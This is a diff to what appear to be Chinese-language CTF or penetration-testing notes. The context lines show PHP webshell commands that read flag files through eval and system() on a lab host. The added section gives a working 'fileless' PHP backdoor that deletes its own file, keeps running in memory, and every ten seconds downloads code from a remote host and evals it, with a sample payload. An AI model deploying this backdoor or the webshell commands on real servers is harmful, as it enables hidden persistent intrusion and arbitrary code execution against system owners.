@@ -48,6 +48,37 @@ http://172.16.2.234:8011/3.php?1=print_r(file_get_contents(%22/flag.txt%22))
 curl "http://172.16.2.234:8011/4.php" -d "1=system('cat /flag*')"
 de9d4919ce86aeb38a5332c7d1c4d24a
 ```
+####
 
+### PHP无文件后门：
+
+php常驻内存的问题，想要将远程文件写入本地，并且让文件常驻内存中。
+代码构想：
+```
+unlink($_SERVER['SCRIPT_FILENAME']); // 删除自身
+ignore_user_abort(true); // 驻留进程，等待指令
+set_time_limit(0); // 不关闭程序，保持连接
+```
+
+webshell.php
+```
+<?php
+unlink($_SERVER['SCRIPT_FILENAME']);
+ignore_user_abort(true);
+set_time_limit(0);
+
+$remote_file = 'http://182.168.2.2/file.txt';
+while($code = file_get_contents($remote_file)){
+  @eval($code);
+  sleep(10);
+};
+?>
+```
+
+http://182.168.2.2/file.txt
+
+```
+file_put_contents('1.txt','hello world '.time());
+```
 
 
